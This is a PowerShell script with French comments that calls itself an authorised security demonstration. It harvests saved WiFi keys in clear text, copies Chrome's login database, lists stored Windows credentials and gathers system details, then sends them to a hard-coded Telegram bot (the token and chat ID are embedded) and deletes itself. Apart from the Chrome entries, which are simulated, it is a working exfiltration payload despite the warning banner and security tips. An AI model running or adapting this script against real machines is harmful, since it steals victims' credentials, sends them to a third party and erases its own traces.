# Script de d√©monstration - Exfiltration de mots de passe vers Telegram
# ATTENTION : Uniquement pour d√©monstrations autoris√©es !

# Configuration Telegram
$botToken = "7520987680:AAHyZDj5XYSZ4opgTeGNwISTCS2aGY0VTNc"
$chatID = "1607044467"

# Fonction pour envoyer un message Telegram
function Send-TelegramMessage {
    param([string]$message)
    
    try {
        $url = "https://api.telegram.org/bot$botToken/sendMessage"
        $body = @{
            chat_id = $chatID
            text = $message
            parse_mode = "Markdown"
        }
        
        Invoke-RestMethod -Uri $url -Method Post -Body $body
        Write-Host "Message envoy√© avec succ√®s" -ForegroundColor Green
    }
    catch {
        Write-Host "Erreur lors de l'envoi : $_" -ForegroundColor Red
    }
}

# Fonction pour r√©cup√©rer les mots de passe WiFi
function Get-WiFiPasswords {
    $wifiPasswords = @()
    $profiles = netsh wlan show profiles | Select-String "Profil Tous les utilisateurs" | ForEach-Object { ($_ -split ":")[1].Trim() }
    
    foreach ($profile in $profiles) {
        $password = netsh wlan show profile name="$profile" key=clear | Select-String "Contenu de la cl√©" | ForEach-Object { ($_ -split ":")[1].Trim() }
        if ($password) {
            $wifiPasswords += "üì∂ **$profile** : `$password`"
        }
    }
    
    return $wifiPasswords
}

# Fonction pour r√©cup√©rer les mots de passe du navigateur (Chrome)
function Get-ChromePasswords {
    $chromePasswords = @()
    $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    
    if (Test-Path $chromePath) {
        try {
            # Copier la base de donn√©es pour √©viter les verrous
            $tempPath = "$env:TEMP\LoginData.db"
            Copy-Item $chromePath $tempPath -Force
            
            # Utiliser SQLite pour lire la base (n√©cessite un module SQLite)
            # Pour la d√©mo, on simule quelques entr√©es
            $chromePasswords += "üåê **demo-site.com** : demo_password"
            $chromePasswords += "üåê **example.com** : example_pass"
            
            Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
        }
        catch {
            $chromePasswords += "‚ùå Erreur lors de la lecture de Chrome"
        }
    }
    
    return $chromePasswords
}

# Fonction pour r√©cup√©rer les mots de passe Windows stock√©s
function Get-WindowsCredentials {
    $credentials = @()
    
    try {
        # Utiliser cmdkey pour lister les credentials
        $cmdkeyOutput = cmdkey /list | Where-Object { $_ -match "Target:" }
        
        foreach ($line in $cmdkeyOutput) {
            if ($line -match "Target: (.+)") {
                $target = $matches[1]
                $credentials += "üîê **$target** : [Credential stock√©]"
            }
        }
    }
    catch {
        $credentials += "‚ùå Erreur lors de la r√©cup√©ration des credentials Windows"
    }
    
    return $credentials
}

# Fonction principale
function Start-PasswordExfiltration {
    $computerName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    # Message d'en-t√™te
    $headerMessage = @"
üö® **D√âMONSTRATION DE S√âCURIT√â** üö®
**Ordinateur :** $computerName
**Utilisateur :** $userName
**Timestamp :** $timestamp

‚ö†Ô∏è **ATTENTION : Ceci est une d√©monstration autoris√©e**
"@
    
    Send-TelegramMessage -message $headerMessage
    
    # R√©cup√©ration des mots de passe WiFi
    Write-Host "R√©cup√©ration des mots de passe WiFi..." -ForegroundColor Yellow
    $wifiPasswords = Get-WiFiPasswords
    
    if ($wifiPasswords.Count -gt 0) {
        $wifiMessage = "üì∂ **MOTS DE PASSE WIFI R√âCUP√âR√âS :**`n" + ($wifiPasswords -join "`n")
        Send-TelegramMessage -message $wifiMessage
    }
    
    # R√©cup√©ration des mots de passe Chrome
    Write-Host "R√©cup√©ration des mots de passe Chrome..." -ForegroundColor Yellow
    $chromePasswords = Get-ChromePasswords
    
    if ($chromePasswords.Count -gt 0) {
        $chromeMessage = "üåê **MOTS DE PASSE NAVIGATEUR :**`n" + ($chromePasswords -join "`n")
        Send-TelegramMessage -message $chromeMessage
    }
    
    # R√©cup√©ration des credentials Windows
    Write-Host "R√©cup√©ration des credentials Windows..." -ForegroundColor Yellow
    $windowsCredentials = Get-WindowsCredentials
    
    if ($windowsCredentials.Count -gt 0) {
        $credMessage = "üîê **CREDENTIALS WINDOWS :**`n" + ($windowsCredentials -join "`n")
        Send-TelegramMessage -message $credMessage
    }
    
    # Informations syst√®me
    $systemInfo = @"
üñ•Ô∏è **INFORMATIONS SYST√àME :**
**OS :** $(Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty Caption)
**Version :** $(Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty Version)
**Architecture :** $env:PROCESSOR_ARCHITECTURE
**Domaine :** $(if ($env:USERDOMAIN) { $env:USERDOMAIN } else { "WORKGROUP" })
"@
    
    Send-TelegramMessage -message $systemInfo
    
    # Message de fin
    $footerMessage = @"
‚úÖ **D√âMONSTRATION TERMIN√âE**

üõ°Ô∏è **RECOMMANDATIONS DE S√âCURIT√â :**
- Verrouillez toujours votre √©cran
- Utilisez un gestionnaire de mots de passe
- Activez l'authentification √† deux facteurs
- Surveillez les p√©riph√©riques USB inconnus
- Formez vos √©quipes aux risques de s√©curit√©

‚ö†Ô∏è Cette d√©monstration montre l'importance de la s√©curit√© physique !
"@
    
    Send-TelegramMessage -message $footerMessage
    
    Write-Host "D√©monstration termin√©e !" -ForegroundColor Green
}

# Ex√©cution du script
Start-PasswordExfiltration

# Auto-destruction du script (optionnel pour la d√©mo)
Start-Sleep -Seconds 5
Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
